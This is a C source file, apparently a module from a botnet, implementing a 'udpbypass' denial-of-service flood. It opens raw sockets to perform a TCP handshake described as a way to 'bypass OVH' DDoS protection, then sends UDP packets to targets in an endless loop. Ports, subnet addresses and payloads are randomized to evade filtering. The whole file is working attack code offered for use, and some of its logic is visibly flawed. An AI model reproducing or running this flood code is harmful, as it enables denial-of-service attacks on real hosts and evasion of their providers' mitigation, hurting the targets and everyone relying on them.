#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>

#include "../../attack.h"

void flood_udpbypass(struct flood *flood)
{
    struct sockaddr_in bind_addr = {0};

    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    // Randomize source port
    if (flood->settings->source_port == 0xffff)
        flood->settings->source_port = rand_next();

    for (i = 0; i < flood->num_of_targets; i++)
    {
        int sock = -1;
        struct sockaddr_in tcp_addr = {0};

        struct flood_target target = flood->targets[i];

        struct iphdr *ip_header;
        struct udphdr *udp_header;

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create datagram socket.
        if ((fd[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
            return;

        // Bind a local server for the source port.
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;
        bind(fd[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        // TCP handshake to bypass OVH

        if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
            return;

        i = 1;
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
        {
            close(sock);
            return;
        }

        tcp_addr.sin_family = AF_INET;
        tcp_addr.sin_port = flood->settings->tcp_dest_port;
        tcp_addr.sin_addr.s_addr = flood->targets[i].addr;

        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            if (tcp_handshake(flood->settings->dest_port, sock, tcp_addr.sin_addr.s_addr, _local_addr(), rand_next()) == 0)
            {
                exit(0);
                return;
            }
            if (flood->settings->csleep != 0)
                usleep(flood->settings->csleep * 1000);
        }

        // End TCP handshake

        // Connect to UDP socket
        connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));

        if (!flood->settings->random_data && flood->settings->payload == NULL)
        {
            flood->settings->payload = (char *)malloc(flood->settings->length);
            rand_str(flood->settings->payload, flood->settings->length);
        }
    }

    // Start sending traffic.
    while (1)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            struct flood_target target = flood->targets[i];

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // Randomize payload when data randomization is turned on.
            if (flood->settings->random_data)
            {
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                flood->settings->payload = (char *)malloc(flood->settings->length);
                rand_str(flood->settings->payload, flood->settings->length);
            }

            send(fd[i], flood->settings->payload, flood->settings->length, MSG_NOSIGNAL);

            if (flood->settings->payload != NULL && _strlen(flood->settings->payload) > 0)
            {
                free(flood->settings->payload);
            }
        }
    }
}
